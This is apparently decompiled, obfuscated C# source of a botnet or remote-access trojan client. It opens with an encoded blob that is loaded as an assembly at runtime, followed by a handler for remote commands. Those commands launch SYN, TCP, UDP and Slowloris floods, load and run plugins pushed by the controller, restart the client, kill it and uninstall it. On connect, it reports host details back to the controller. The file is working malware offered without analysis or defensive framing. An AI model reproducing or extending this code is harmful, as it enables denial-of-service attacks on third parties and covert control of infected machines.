		return Assembly.Load(Encoding.GetEncoding(1252).GetBytes(Class12.smethod_3("eYa8LC8sLCwwLCwsKyssLOQsLCwsLCwsbCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsrCwsLDpL5jos4DX5TeQtePlNgJSVn0ycnpuTno2ZTI+NmpqboEyOkUyeoZpMlZpMcHt/TJmbkJFaOTk2UCwsLCwsLCx8cSwseC0vLGf6uHosLCwsLCwsLAwsLk03LTQsLEgsLCwyLCwsLCwsumYsLCxMLCwsbCwsLCxsLCxMLCwsLiwsMCwsLCwsLCwwLCwsLCwsLCysLCwsLiwsLCwsLC8sbLEsLDwsLDwsLCwsPCwsPCwsLCwsLDwsLCwsLCwsLCwsLGxmLCx3LCwsLGwsLKwvLCwsLCwsLCwsLCwsLCwsLCwsLIwsLDgsLCzUZSwsSCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsTCwsNCwsLCwsLCwsLCwsNEwsLHQsLCwsLCwsLCwsLFqgkaSgLCwswEYsLCxMLCwsSCwsLC4sLCwsLCwsLCwsLCwsLEwsLIxanp+ejywsLKwvLCwsbCwsLDAsLCxKLCwsLCwsLCwsLCwsLCxsLCxsWp6RmJuPLCw4LCwsLIwsLCwuLCwsTiwsLCwsLCwsLCwsLCwsbCwsbiwsLCwsLCwsLCwsLCwsLCycZiwsLCwsLHQsLCwuLDEs1FEsLCxALCwtLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLIIuVD0sLDYsLC6fPiwsNqk1LCwwLFYsLD9cLyyFLCwsLSwsPSyfPywsNqw3LCwwn0AsLDasNiwsMKo2LCwwqjcsLDAum0EsLDYsqjcsLDCbQiwsNiyqNywsMJtDLCw2Nqo3LCwwm0QsLDYsQKw3LCwwQKw2LCwwMjdXLDNWLCwsP1wuLH8sLCwuLCw9LC6fRSwsNqw3LCwwn0AsLDasNiwsMKo2LCwwqjcsLDCbRiwsNqEzLCwuNqo3LCwwm0IsLDYsqjcsLDCbRCwsNixArDcsLDBArDYsLDAyN1csM1ZKLlQ9LCw2Viw/XC0sNywsLC8sLD0upz4sLDA2VywyVk4uL6k+LCwwVj9cLSw3LCwsMCwsPS6nPywsMDZXLDJWTi4vqT8sLDBWP1wvLHYsLCwxLCw9LC5USCwsNlRJLCw2/EIsLC1USiwsNkObSywsNjYyupVCKi5CKi04NFlCLDJCxqBCLCwtm0wsLDafTSwsNjdXNKpOLCw2N1csM1Y2LFYsLCw/XC8sXCwsLDIsLD0upzgsLDA2MjczL1RPLCw2oDgsLC04Lqg4LCwwNDNULSwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDIsLD0upzgsLDA2MjczL1RRLCw2oDgsLC04Lqg4LCwwNDNULSwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDIsLD0upzksLDA2MjczL1RPLCw2oDgsLC04Lqg5LCwwNDNULSwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDIsLD0upzksLDA2MjczL1RRLCw2oDgsLC04Lqg5LCwwNDNULSwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDIsLD0upzosLDA2MjczL1RPLCw2oDgsLC04Lqg6LCwwNDNULSwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDIsLD0upzosLDA2MjczL1RRLCw2oDgsLC04Lqg6LCwwNDNULSwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDMsLD0upzssLDA2MjczL1RPLCw2oC8sLC44Lqg7LCwwNDNULiwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDMsLD0upzssLDA2MjczL1RRLCw2oC8sLC44Lqg7LCwwNDNULiwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDQsLD0upzwsLDA2MjczL1RPLCw2oC4sLC44Lqg8LCwwNDNULywsVzYyMyotQiotOTVZBFY/XC8sXCwsLDQsLD0upzwsLDA2MjczL1RRLCw2oC4sLC44Lqg8LCwwNDNULywsVzYyMyotQiotOTVZBFY/XC8sXCwsLDUsLD0upz0sLDA2MjczL1RPLCw2oDAsLC44Lqg9LCwwNDNUMCwsVzYyMyotQiotOTVZBFY/XC8sXCwsLDUsLD0upz0sLDA2MjczL1RRLCw2oDAsLC44Lqg9LCwwNDNUMCwsVzYyMyotQiotOTVZBFY/XC8scCwsLDYsLD0sLzYyQlouV0kupzssLDBAKi03M1k6Lqc7LCwwLjCbMiwsMixXSS6nPCwsMEAqLTczWToupzwsLDAuMJsuLCwyLFcsVj9cLyxJLCwsNywsPSwupz0sLDBAKi02Mlk6Lqc9LCwwLi+bNiwsMixWLCwsP1wvLEksLCw3LCw9LC6nOCwsMEAqLTYyWToupzgsLDAuQJtSLCw2LFYsLCwvXC8sdCwsLCwsLCwsLqc4LCwwQECbUiwsNiwupzksLDBAQJtSLCw2LC6nOiwsMEBAm1IsLDYsLqc8LCwwQECbLiwsMiwupz0sLDBAQJs2LCwyLFZKLlQ9LCw2Vm5/dm4tLC0sLCwsLDgsLCyiXlpcWmFcY15jLCwsLDEsmCwsLDA1LCxPqiwsnDUsLAwzLCxPf6CelZqTnywsLCx8PSwsNCwsLE+BfyyEPSwsPCwsLE9zgXVwLCwslD0sLMQuLCxPbpibjiwsLCwsLCwuLCwtg0niNTU0LCwsJlFfLEIsLC0sLCxRLCwsNSwsLD8sLCxeLCwsXSwsLFIsLCwwLCwsPywsLDcsLCwtLCwsMiwsLC0sLCw4LCwsRiwsLC0sLCwtLCwsLiwsLDAsLCwsLDYsLSwsLCwsMizCLLssMizULLssMizZLLssMiztLLssMiz6LLssMixILbssMixzLVgtMiyuLX8tMizLLcEtMiyILrssNiyxLpwuMiwFLrssMiwjMBEwMiw6MREwMixXMREwMix2MREwMiyPMREwMiyoMREwMizDMREwMizeMREwMiwWMfcxMiwqMfcxMiw4MhEwMixRMhEwMiyBMm4ykyyVMiwsMizEMqQyMizkMqQyMiwCMrssMiwYMsEtMiw1M6QyMixQM7ssMixdMxEwMixyM7ssMiy6M7ssMizcM8szMiz/M7ssLCwsLC0sLCwsLC0sLSwtLSwsQixVLDEsLSwtLC0tLCxcLFUsMSwtLDEsLS0sLG4sVSwxLC0sNSwtLSwsgyxVLDUsLSw5LC0tLCyPLFUsNSwwLDksLUw8LJQsVSw5LDMsOSwtLDwsnyxVLDksNiw6LK0sPCyqLFUsOSw4LD0sMjIeLFYsgqwmLFksgqwrLFksMjIeLFYsgqwzLWcsgqw6LWcsMixBLWssMixNLW4sMix6LXIsPSy+LX0sPSzYLYEsLSwSLsosLSxTL8osLSx2L8osLSyZL9QsLSy2L94sLSzWL+gsLSwXL/osLSw6MP4sLCwsLC8sskTgLDYsLSwsLCwsLyzyLeYsPCwvLCwsLCwvLPItCCxELDEsLCwsLC8s8i0ULFAsNSwsLCwsLyyyROAsNiw2LCwsLCwvLPIt5iw8LDgsLCwsLC8s8i0ILEQsOiwsLCwsLyzyLRQsUCw+LCwsLCwvLLJE4Cw2LD8sLCwsLC8s8i3mLDwsQSwsLCwsLyzyLQgsRCxDLCwsLCwvLPItFCxQLEcsfEwsLCwsskTgLHksSCyUTCwsLCzCLNsthSxILPxMLCwsLMIs5S2MLEksW00sLCwsskTgLHksSiwsLCwsLCzyOfEtkyxKLCwsLCwsLPI5+i2TLEosLCwsLCws8jkKLZMsSiwsLCwsLCzyORUtlyxKLCwsLCwsLPI5Ji2cLEosLCwsLCws8jk+LpwsSiwsLCwsLCzyOVAunCxKLGRNLCwsLLI0XC6gLEose00sLCwssjRyLqUsSiwsLCwsLCzyOZAuqyxLLCwsLCwsLPI5ti6wLEsshE0sLCwssjTELrUsSyybTSwsLCyyNNQuuSxLLKRNLCwsLLI05C6+LEwsLCwsLCws8jHtLnksTCwsLCwsLCzyMfguwyxMLPpNLCwsLPItAC65LE4sAE0sLCwssjQkLs4sTyw8TiwsLCyyNDovzixQLHhOLCwsLLI0Wy/OLFEstE4sLCwssjRnL84sUizwTiwsLCyyNH4vzixTLCxPLCwsLLI0ii/OLFQsaE8sLCwssjSfL9gsVSykTywsLCyyNKkv2CxWLOBPLCwsLLI0vS/iLFcsHE8sLCwssjTIL+IsWCxYUCwsLCyyNN8v7CxZLJRQLCwsLLI07C/sLFos0FAsLCwssiz8L/IsWywgUCwsLCyyLAEvpSxdLExRLCwsLLIsDC95LF4seFEsLCwsrSwVL3ksXizMUSwsLCywROAseSxeLCwsLSzOMCwsLizVMCwsLSzcMCwsLiwVLywsLSzcMCwsLiwVLywsLyzjMCwsMCzOMCwsLSzsMCwsLSzOMCwsLizVMCwsLSzcMCwsLiwVLywsLSzcMCwsLiwVLywsLyzjMCwsMCzOMCwsLSzsMCwsLSzOMCwsLizVMCwsLSzcMCwsLiwVLywsLSzcMCwsLiwVLywsLyzjMCwsMCzOMCwsLSzsMCwsLSzzMCwsLSz4MCwsLSz6MCwsLSz6MCwsLSwAMCwsLiwVLywsLSwAMCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSz6MCwsLSwMMCwsLiwVLywsLSwVL5Us4CwmLJ0s4CwmLKUs4CwmLK0s4CwmLLUs4CwmLL0s4CwmLMUs4CwmLM0s4CwmLNUs4CwrLN0s4CwmLOUs4CwmLO0s4CwmLPUs4CwwLQUs4Cw2LQ0s4Cx5LBUs4Cx5LEUs4Cx5LDgs4Cx5LHUs4Cx5LG0s4Cx5LG0s2y1BLR0sHzJ5LHUsJTJILR0sLTN5LHUs4CxULW0s5S1aLSUs4Cx5LEUsVTNwLTUtZjN2LS0thDN/LTUtljOILd0sqjOTLF0s4CwmLF0stDNuLEUtwzOZLU0t6DOlLUUt+DOZLY0s5iz4LTQsNCxdLDQsOCxiLDQsQCxdLDQsRCxiLFosTywtLlospyyiLlosXyw6LlosnyyZLlosNywALVosPywMLVosRywnLVosVywALVosZywnLVosdywnLVosfyxZLlosjyyDLloslyyQLm0uByxiLI0uByxiLCwvByxiLEwvByxiLKwvByxiLMwvByxiLE0tYC1nLWwtkS23LcYt1S3kLe4t9C01LC0sLCwSLl0sLCxTL10sLCx2L10sLCyZLzgsLCy2LzQsLCzWLzwsNSwtLCwsVzABLCwsXDABLCwsaDABLCwsbzAFLCwsfDAKLCwskDAKLCwsnjAKLCwspjAOLCwsiC4TLCwsuDAYLCwswjAdLCwsSC0hLDwsTywuLDQsTiwuLC4sPSwvLDwsUSwwLDQsUCwwLC4sPiwxLDQsUiwyLDwsUywyLC4sPywzLDwsVSw0LDQsVCw0LC4sQCw1LDwsVyw2LDQsViw2LC4sQSw3LDwsWSw4LDQsWCw4LC4sQiw5LC4sQyw7LC4sRCw9LC0sRSw9LC4sRiw/LC4sRyxBLC0sSSxDLC4sSCxDLC4sSixFLDstMKwsLC0sLCwsLCwsLCwsLCwsqiwsLC4sLCwsLCwsLCwsLC0ssiwsLCwsLiwsLCwsLCwsLCwsLSycLiwsLCx1LLItdSzBLXUs0C11LN8tLCwsaHmbkKGYkWosdXyYoZOVmlqQmJgse6GgnKGgcaKRmqB0jZqQmJGeLHyYoZOVmix1mpyhoHGikZqgdI2akJiRnix+kY+RlaKRkHGikZqgdI2akJiRnix8mKGTlZp/oI2gkSx/lZCRLHyYoZOVmm2ek58sf5GelY2YlaaRnix1fJihk5WaLJmfj5uemJWOLH+ln6CRmSx5oZiglY+Nn6BwkZiRk42gkSxxmqGZLHuOlpGPoCxaj6Cbnix1mqKbl5EsdW2fpZqPfpGfoZigLG2fpZqPb42YmI6Nj5csbpGTlZp1mqKbl5EsLE4W83GakHWaopuXkSyijZihkYuLLHp7enEsfoF6enV6cyxveHVxeoAsf3F+gnF+LHSRjZCRnixzoZWQLHyYoZOVmnOhlZAsf6WfoJGZWm+bmJiRj6CVm5qfWnORmpGelY8seJWfoIxdLHCNoI0sf6WfoJGZWn6hmqCVmZFaf5GelY2YlaaNoJWbmlpym56ZjaCgkZ6fWm6Vmo2epSxulZqNnqVym56ZjaCgkZ4sjpIsf6WfoJGZWnV7LHmRmZuepX+gnpGNmSyZnyx/kZ6VjZiVppEscJGfkZ6VjZiVppEsk5Ggi3qNmZEsk5Ggi3CRn4+elZyglZuaLJORoIttoaCUm54sk5Ggi2+hnp6RmqB/oI2gkSyTkaCLf6CbnHuacJWfj5uampGPoJWbmiyTkaCLcaSRj6GgkXuaeJuNkCyTkaCLdI2fcpuemSyTkaCLcaSRj6GgkXuaeJuNkG2ek58sn5Ggi3GkkY+hoJF7mnibjZBtnpOfLIKRnp+Vm5osk5Ggi4KRnp+Vm5osf6WfoJGZWoOVmpCbo59acpuemZ8scpuemSyTkaCLdZqcoaBym56ZLJORoIt/oI2gkXuOlpGPoCyfkaCLf6CNoJF7jpaRj6Ask5Ggi3OhlZAsdZqVoJWNmJWmkSxxpJGPoaCRLH+gm5wscaKRmqB0jZqQmJGeLHGkkY+hoJWbmm+bmZyYkaCRLI2QkItxpJGPoaCVm5pvm5mcmJGgkSyekZmbopGLcaSRj6GglZuab5uZnJiRoJEsf6CNnqCRkCyNkJCLf6CNnqCRkCyekZmbopGLf6CNnqCRkCx/oJucnJGQLI2QkIt/oJucnJGQLJ6RmZuikYt/oJucnJGQLHWanKGgLI2QkIt1mpyhoCyekZmbopGLdZqcoaAse6GgnKGgLI2QkIt7oaCcoaAsnpGZm6KRi3uhoJyhoCx+kY+RlaKRkCyNkJCLfpGPkZWikZAsnpGZm6KRi36Rj5GVopGQLH+RmpAse5p+kY+RlaKRkCxxpJGPoaCRkCyRLGhxpJGPoaCRe5p4m42QbZ6Tn2qXi4tujY+XlZqTcpWRmJAsaH+gjaCRe46WkY+gapeLi26Nj5eVmpNylZGYkCx6jZmRLHCRn4+elZyglZuaLG2hoJSbnixvoZ6ekZqgf6CNoJEsf6CbnHuacJWfj5uampGPoJWbmixxpJGPoaCRe5p4m42QLHSNn3KbnpkscaSRj6GgkXuaeJuNkG2ek58sdZqcoaBym56ZLH+gjaCRe46WkY+gLJuOlpGPoCyZkaCUm5Asn5GakJGeLI+NmJiOjY+XLJ6Rn6GYoCyNnpOfLI4soo2YoZEsn6CNoJF7jpaRj6Asn5WQkSx/pZ+gkZlafpGSmJGPoJWbmixtn5+RmY6YpYCVoJiRbaCgnpWOoaCRLG2fn5GZjpilcJGfj56VnKCVm5ptoKCelY6hoJEsbZ+fkZmOmKVvm5qSlZOhno2glZuabaCgnpWOoaCRLG2fn5GZjpilb5uZnI2apW2goJ6VjqGgkSxtn5+RmY6YpXyem5Chj6BtoKCelY6hoJEsbZ+fkZmOmKVvm5ylnpWTlKBtoKCelY6hoJEsbZ+fkZmOmKWAno2QkZmNnpdtoKCelY6hoJEsbZ+fkZmOmKVvoZigoZ6RbaCgnpWOoaCRLH+ln6CRmVp+oZqglZmRWnWaoJGem5x/kZ6ilY+Rnyxvm5mClZ+VjpiRbaCgnpWOoaCRLHOhlZBtoKCelY6hoJEsbZ+fkZmOmKWCkZ6flZuabaCgnpWOoaCRLG2fn5GZjpilcpWYkYKRnp+Vm5ptoKCelY6hoJEsf6WfoJGZWnCVjZOam5+glY+fLHCRjqGTk42OmJFtoKCelY6hoJEscJGOoZOTlZqTeZuQkZ8sf6WfoJGZWn6hmqCVmZFab5uZnJWYkZ5/kZ6ilY+Rnyxvm5mclZiNoJWbmn6RmI2kjaCVm5qfbaCgnpWOoaCRLH6hmqCVmZFvm5mcjaCVjpWYlaClbaCgnpWOoaCRLH+RnpWNmJWmjY6YkW2goJ6VjqGgkSx/oJ6RjZksb5ibn5EsgJttnp6NpSxwlZ+cm5+RLG+bmZyVmJGec5GakZ6NoJGQbaCgnpWOoaCRLIClnJEsc5GggKWckSxtn5+RmY6YpSxzkaBtn5+RmY6YpSx+oZqglZmRgKWckXSNmpCYkSxzkaCApZyRcp6bmXSNmpCYkSxzkaBvoZ+gm5ltoKCelY6hoJGfLJORoIuCjZihkSxxmZygpSxwkZiRk42gkSxvm5mOlZqRLH+ln6CRmVqAlJ6RjZCVmpMsdZqgkZ6Ym4+XkZAsb5uZnI2ekXGkj5SNmpORLH6RmZuikSxxopGaoG2ek58sLCwsLC9MLCwsLCwASdsQevzWbcRL11CUWWJuLDTjpoiCRWAMtTFMLi1IRDNMLi0+UD5IN0wwPj0+UD5IPkFIMUwtLT49LjI0LzI9QDAsLCwsMC0sLCwvMj1ELjI6LzI9RTIyQT5JLUgvTCwtLzI+TS8yPlEyLC1JMT5IMiwtPkhJMS9MLDowTCw9QC9MLC4wTCw+SDFMLS0+SDBMLD5VMEwsPlkvTCxIMEwtLUgwTCw9RTJMLi1IPkgvMj5dMUwtLT5dLzI+ODFMLS0+OC8yPjQxTC0tPjQvMj48MUwtLT48M0wuLT1EPkgvMj5ILjJIL1QsOjBULD1AL1QsLjBULD5IMFQsPlUwVCw+WS9ULEgwVCw9RTBMLS06MEwtLS4xTC0tPZUwTC0tNDFBPkktSDJMLi0+pUgwTCxJMTIzLkkxSTExTC0tSTExTC1IPqUyMy4+SD5IMDMtPkgvMy1IMUwsPqytNCwtPqyxPqytNCwtPqytPay1NEwuSUg+rK0uMzMvSUg9RS43LC4+rLk+rLk+rLk4PC0vSiw8SixKLEosMDYtPl01MzA+XT5dPl0uMDYtPjg1MzA+OD44PjguMDYtPjQ1MzA+ND40PjQuMDYtPjw1MzA+PD48PjwuMTMuPUQuLzMtLjNMLi1IPqzBNy0sMnyYoZOVmiwsRi0sQXqRoFmDkY2ikUx8mKGTlZpMbo2fkSwsMS0sLCwsOC0sM6R/lZiRmqAsLEotLEVvm5ylnpWTlKBM7tVMpH+VmJGaoExeXF1dLCxVLSxQY19ijWCRXGFZj45lkVlgjmGSWWWQkGFZXo2PYmWRko9ckGVlLCw4LSwzXVpcWlxaXCwsNC0sMy0sLCwsNC0sNCwsLCwsSi0sLSyALkKDno2cepuacaSPkZyglZuagJSem6OfLSwsLCwsLCxn+rh6LCwsLC4sLCymLCws8GUsLPBHLCx+f3B/nKO06iaYLHmv4Dk3kFaf3S4sLCxvZoiBn5Gen4h6jaCUjZqIcJuPoZmRmqCfiIKVn6GNmEx/oKGQlZtMXlxdXIh8npuWkY+gn4h8npuWkY+gTHBwm3+Rnoh8mKGTlZqIm46WiHCRjqGTiHV8mKGTlZpanJCOLCwslGYsLCwsLCwsLCwsqmYsLCxMLCwsLCwsLCwsLCwsLCwsLCwsLCwsLJxmLCwsLCwsLCyLb5uecJiYeY2VmiyZn4+bnpGRWpCYmCwsLCwsK1EsTGwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLSw8LCwsRCwsrCwsLCwsLCwsLCwsLCwsLSwtLCwsXCwsrCwsLCwsLCwsLCwsLCwsLSwsLCwsdCwsLIRsLCxQLywsLCwsLCwsLCxQL2AsLCyCLH8siyyCLHEsfix/LHUseyx6LIssdSx6LHIseywsLCws6TAbKiwsLSwsLC0sLCwsLCwsLSwsLCwsaywsLCwsLCwwLCwsLiwsLCwsLCwsLCwsLCwsLHAsLCwtLIIsjSyeLHIslSyYLJEsdSyaLJIsmywsLCwsUCwwLCwsgCyeLI0smiyfLJgsjSygLJUsmyyaLCwsLCwsLNwwsC4sLC0sfyygLJ4slSyaLJMsciyVLJgskSx1LJoskiybLCwsjC4sLC0sXCxcLFwsXCxcLGAsjixcLCwscCxCLC0sbyybLJksmSyRLJosoCyfLCwseiyRLKAsWSyDLJEsjSyiLJEsTCx8LJgsoSyTLJUsmixMLG4sjSyfLJEsLCxcLDQsLSxvLJssmSycLI0smiylLHosjSyZLJEsLCwsLKQsfyyVLJgskSyaLKAsLCxkLDMsLSxyLJUsmCyRLHAskSyfLI8sniyVLJwsoCyVLJssmiwsLCwsfCyYLKEskyyVLJosLCwsLFwsNCwtLHIslSyYLJEsgiyRLJ4snyyVLJssmiwsLCwsXSxaLFwsWixcLFosXCwsLGQsOCwtLHUsmiygLJEsniyaLI0smCx6LI0smSyRLCwsdSx8LJgsoSyTLJUsmixaLJAsmCyYLCwshCxFLC0seCyRLJMsjSyYLG8smyycLKUsniyVLJMslCygLCwsbyybLJwspSyeLJUskyyULKAsTCzVLEwspCx/LJUsmCyRLJosoCxMLF4sXCxdLF0sLCwsLGwsOCwtLHssniyVLJMslSyaLI0smCxyLJUsmCyRLJosjSyZLJEsLCx1LHwsmCyhLJMslSyaLFoskCyYLJgsLCxcLDMsLSx8LJ4smyyQLKEsjyygLHosjSyZLJEsLCwsLHwsmCyhLJMslSyaLCwsLCxgLDQsLSx8LJ4smyyQLKEsjyygLIIskSyeLJ8slSybLJosLCxdLFosXCxaLFwsWixcLCwsZCw0LC0sbSyfLJ8skSyZLI4smCylLEwsgiyRLJ4snyyVLJssmiwsLF0sWixcLFosXCxaLFwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsXCwsOCwsLLxmLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLA==", bool_0: true)));
	}

	private static void smethod_7(string string_1)
	{
	}

	private static void smethod_8(object sender, EventArgs2 e)
	{
		//IL_045d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0463: Invalid comparison between Unknown and I4
		Class6 @class = sender as Class6;
		try
		{
			Class5 class2 = new Class5(e.Byte_0);
			switch (e.Enum0_0)
			{
			case Class6.Enum0.const_1:
				if (Class10.Boolean_0)
				{
					@class.method_9(Class10.String_0 + " Flood Already Active");
					return;
				}
				Class10.smethod_0(Class10.Enum2.const_1, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class10.smethod_1();
				@class.method_9("SYN Flood Active");
				break;
			case Class6.Enum0.const_2:
				if (Class10.Boolean_0)
				{
					@class.method_9(Class10.String_0 + " Flood Already Active");
					return;
				}
				Class10.smethod_0(Class10.Enum2.const_0, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class10.smethod_1();
				@class.method_9("TCP Flood Active");
				break;
			case Class6.Enum0.const_3:
				if (Class10.Boolean_0)
				{
					@class.method_9(Class10.String_0 + " Flood Already Active");
					return;
				}
				Class10.smethod_0(Class10.Enum2.const_2, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class10.smethod_1();
				@class.method_9("UDP Flood Active");
				break;
			case Class6.Enum0.const_4:
				if (Class10.Boolean_0)
				{
					Class10.smethod_2();
					@class.method_9(Class10.String_0 + " Flood Inactive");
				}
				else
				{
					@class.method_9("No Flood Active");
				}
				break;
			case Class6.Enum0.const_5:
			{
				object[] parameter2 = new object[2]
				{
					class2.ReadString(),
					sender
				};
				new Thread(smethod_16).Start(parameter2);
				break;
			}
			case Class6.Enum0.const_6:
			{
				object[] parameter = new object[3]
				{
					class2.ReadString(),
					class2.ReadString(),
					sender
				};
				new Thread(smethod_17).Start(parameter);
				break;
			}
			case Class6.Enum0.const_7:
				try
				{
					Class1.smethod_1();
					@class.method_10(bool_2: false);
					Process.Start(Process.GetCurrentProcess().MainModule!.FileName);
					Process.GetCurrentProcess().Kill();
				}
				catch
				{
					(sender as Class6).method_9("Restart Failed");
				}
				break;
			case Class6.Enum0.const_8:
			{
				string @string = Encoding.Default.GetString(e.Byte_0);
				if (@string != Encoding.Default.GetString(Class12.smethod_1(Convert.FromBase64String(Class2.string_10), bool_0: false)))
				{
					(sender as Class6).method_9("Invalid password");
					return;
				}
				if (Class2.bool_0)
				{
					foreach (GClass0 item in list_0)
					{
						item.method_3();
					}
					Class9.smethod_4();
				}
				Process.GetCurrentProcess().Kill();
				break;
			}
			case Class6.Enum0.const_9:
				try
				{
					if (GClass2.smethod_3(Encoding.GetEncoding(1252).GetBytes(class2.ReadString())))
					{
						string text = GClass2.sortedList_1.Values[GClass2.sortedList_1.Count - 1].get_Name() + " Stored";
						if (Class2.bool_0)
						{
							text += " and Saved";
							GClass2.smethod_0();
						}
						@class.method_9(text);
						break;
					}
					throw new Exception(GClass2.smethod_6());
				}
				catch (Exception)
				{
					@class.method_9("Plugin Error: Invalid or Already Loaded");
				}
				break;
			case Class6.Enum0.const_10:
				try
				{
					PluginArgs val = Serializer.Deserialize(e.Byte_0);
					if (!GClass2.sortedList_1.ContainsKey(val.PluginGuid))
					{
						@class.method_9("Plugin not found");
						break;
					}
					IPlugin iplugin_ = GClass2.sortedList_1[val.PluginGuid];
					GClass2.smethod_7(sender, iplugin_, val);
				}
				catch (Exception ex)
				{
					@class.method_9("Failed Plugin Execution: " + ex.Message);
				}
				break;
			case Class6.Enum0.const_11:
				try
				{
					Guid guid = new Guid(class2.ReadString());
					for (int i = 0; i < GClass2.sortedList_1.Count; i++)
					{
						if (GClass2.sortedList_1.Keys[i] == guid && (int)GClass2.sortedList_1.Values[i].get_CurrentState() == 1)
						{
							GClass2.sortedList_1.Values[i].Stop(sender);
							break;
						}
					}
				}
				catch
				{
					@class.method_9("Failed to stop plugin");
				}
				break;
			case Class6.Enum0.const_13:
				bool_0 = true;
				break;
			case Class6.Enum0.const_17:
				@class.method_10(bool_2: true);
				break;
			default:
				@class.method_9("Broken\\Invalid Header");
				break;
			case Class6.Enum0.const_19:
				bool_1 = true;
				int_0 = BitConverter.ToInt32(e.Byte_0, 0);
				@class.method_10(bool_2: true);
				break;
			case Class6.Enum0.const_20:
				if (Class10.Boolean_0)
				{
					@class.method_9(Class10.String_0 + " Flood Already Active");
					return;
				}
				Class10.smethod_0(Class10.Enum2.const_3, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class10.smethod_1();
				@class.method_9("Slowloris Flood Active");
				break;
			}
			class2.Close();
		}
		catch
		{
		}
	}

	private static void smethod_9(object sender, EventArgs e)
	{
		Class6 @class = (Class6)sender;
		Class3 class2 = new Class3();
		class2.Write(Class8.smethod_1());
		class2.Write(Class11.smethod_0());
		class2.Write(Class2.string_7);
		class2.Write(Class12.smethod_3(@class.String_1, bool_0: true));
		class2.Write(Class2.string_11);
		byte[] data = class2.method_0();
		@class.method_7(new Class7(Class6.Enum0.const_15, data).method_0());
		@class.method_3();
		Class0.smethod_0(@class);
		class2 = null;
		data = null;
	}

	private static void smethod_10(object sender, EventArgs e)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Invalid comparison between Unknown and I4
		Class6 @class = (Class6)sender;
		Class0.smethod_1(@class);
		@class.method_11();
		if (bool_0)
		{
			Thread.Sleep(TimeSpan.FromSeconds(30.0));
			bool_0 = false;
		}
		else if (bool_1)
		{
			Thread.Sleep(TimeSpan.FromSeconds(int_0));
			int_0 = 0;
			bool_1 = false;
		}
		if (GClass2.sortedList_1.Count > 0)
		{
			foreach (IPlugin value in GClass2.sortedList_1.Values)
			{
				if ((int)value.get_CurrentState() == 1 && value.get_StopOnDisconnection())
				{
					value.Stop(sender);
				}
			}
		}
		@class.method_0();
	}

	private static void smethod_11(object sender, EventArgs1 e)
	{
	}

	private static void smethod_12(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
